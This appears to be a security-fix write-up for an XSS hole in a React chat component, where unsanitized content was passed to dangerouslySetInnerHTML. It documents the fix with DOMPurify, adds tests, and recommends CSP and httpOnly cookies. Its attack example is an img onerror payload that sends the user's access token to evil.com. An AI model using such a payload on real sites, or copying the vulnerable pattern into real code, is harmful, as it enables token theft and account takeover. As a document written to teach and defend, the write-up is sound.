# XSS Vulnerability Fix

## Issue Description

**Severity:** ðŸ”´ CRITICAL

**Location:** `frontend/src/components/ChatMessage.js`

**Vulnerability:** Cross-Site Scripting (XSS) via unsanitized HTML rendering

The component was using `dangerouslySetInnerHTML` to render user-generated content without any sanitization. This allowed attackers to inject malicious JavaScript that would execute in other users' browsers.

### Attack Example

An attacker could send a chat message like:
```html
<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('access_token'))">
```

This would:
1. Execute JavaScript in the victim's browser
2. Steal authentication tokens from localStorage
3. Send stolen tokens to the attacker's server
4. Allow complete account takeover

## Solution Implemented

### 1. Added DOMPurify Library

**File:** `frontend/package.json`

Added `dompurify@^3.0.6` as a dependency. DOMPurify is a widely-trusted XSS sanitization library that:
- Removes all potentially malicious HTML/JavaScript
- Maintains safe HTML formatting
- Has zero dependencies
- Is actively maintained and audited

### 2. Updated ChatMessage Component

**File:** `frontend/src/components/ChatMessage.js`

**Before (Vulnerable):**
```javascript
const formatContent = (content) => {
  return content
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/\n/g, '<br>');
};

// Later in render:
<div dangerouslySetInnerHTML={{ __html: formatContent(message.content) }} />
```

**After (Secure):**
```javascript
import DOMPurify from 'dompurify';

const formatContent = (content) => {
  const formatted = content
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/\n/g, '<br>');
  
  // Sanitize HTML to prevent XSS attacks
  return DOMPurify.sanitize(formatted, {
    ALLOWED_TAGS: ['strong', 'em', 'br', 'p', 'span', 'div', 'ul', 'ol', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['class'],
    KEEP_CONTENT: true
  });
};

// Later in render (with security comment):
{/* Content is sanitized via DOMPurify in formatContent() to prevent XSS */}
<div dangerouslySetInnerHTML={{ __html: formatContent(message.content) }} />
```

## Security Configuration

The DOMPurify configuration is intentionally restrictive:

- **ALLOWED_TAGS**: Only safe formatting tags that don't execute scripts
- **ALLOWED_ATTR**: Only `class` attribute for styling (no `onclick`, `onerror`, etc.)
- **KEEP_CONTENT**: Preserves text content even if tags are removed

This configuration:
âœ… Allows legitimate markdown formatting
âœ… Blocks all JavaScript execution
âœ… Blocks inline event handlers
âœ… Blocks dangerous tags (`<script>`, `<iframe>`, etc.)
âœ… Blocks dangerous attributes (`onclick`, `onerror`, etc.)

## Testing the Fix

### Manual Test

1. Send a message with malicious content:
```
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
**Bold text** with *italic*
```

2. Expected result:
   - Scripts are completely removed (no alert)
   - Image with onerror is removed
   - Bold and italic formatting still works

### Automated Test

Create a test file: `frontend/src/components/__tests__/ChatMessage.test.js`

```javascript
import React from 'react';
import { render } from '@testing-library/react';
import ChatMessage from '../ChatMessage';

describe('ChatMessage XSS Protection', () => {
  it('should sanitize malicious script tags', () => {
    const message = {
      id: '1',
      role: 'user',
      content: '<script>alert("XSS")</script>Hello',
      timestamp: new Date().toISOString(),
    };
    
    const { container } = render(<ChatMessage message={message} />);
    const scriptTags = container.querySelectorAll('script');
    
    expect(scriptTags.length).toBe(0);
    expect(container.textContent).toContain('Hello');
  });

  it('should sanitize inline event handlers', () => {
    const message = {
      id: '2',
      role: 'user',
      content: '<img src=x onerror="alert(\'XSS\')">',
      timestamp: new Date().toISOString(),
    };
    
    const { container } = render(<ChatMessage message={message} />);
    const images = container.querySelectorAll('img');
    
    images.forEach(img => {
      expect(img.getAttribute('onerror')).toBeNull();
    });
  });

  it('should preserve safe formatting', () => {
    const message = {
      id: '3',
      role: 'user',
      content: '**Bold** and *italic* text',
      timestamp: new Date().toISOString(),
    };
    
    const { container } = render(<ChatMessage message={message} />);
    
    expect(container.querySelector('strong')).toBeTruthy();
    expect(container.querySelector('em')).toBeTruthy();
  });
});
```

## Installation

To apply this fix:

```bash
# Install dependencies
cd frontend
npm install

# Run tests (if available)
npm test

# Build for production
npm run build
```

## Additional Recommendations

While this fix addresses the immediate XSS vulnerability, consider these additional security measures:

### 1. Move Tokens to HttpOnly Cookies
**Current:** Tokens stored in `localStorage` (vulnerable to XSS)
**Better:** Use `httpOnly` cookies (immune to XSS)

### 2. Implement Content Security Policy (CSP)
Add CSP headers to prevent inline scripts entirely:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
```

### 3. Add Input Validation on Backend
Sanitize or validate chat messages on the server side as well (defense in depth).

### 4. Regular Security Audits
- Run `npm audit` regularly to check for vulnerable dependencies
- Use tools like Snyk or Dependabot for automated vulnerability scanning

## References

- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [React Security Best Practices](https://react.dev/learn/writing-markup-with-jsx#the-rules-of-jsx)

## Status

âœ… **FIXED** - XSS vulnerability patched with DOMPurify sanitization
ðŸ“… **Date:** October 4, 2025
ðŸ‘¤ **Reviewed by:** Security Audit

